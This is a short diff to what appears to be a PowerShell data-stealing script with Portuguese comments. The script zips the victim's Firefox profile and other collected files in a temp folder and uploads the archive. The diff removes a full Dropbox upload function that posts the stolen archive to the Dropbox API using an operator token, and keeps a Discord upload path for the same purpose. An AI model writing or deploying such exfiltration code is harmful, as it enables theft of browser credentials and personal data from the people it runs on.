@@ -57,9 +57,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Inserir os tokens pedidos abaixo "dropbox e/ou discord". 
-
-#$db = ""
+# Inserir o token do discord". 
 
 #$dc = ""
 
@@ -546,22 +544,6 @@ Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profile
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
-
-# Upload para a Dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 #Upload para o Discord
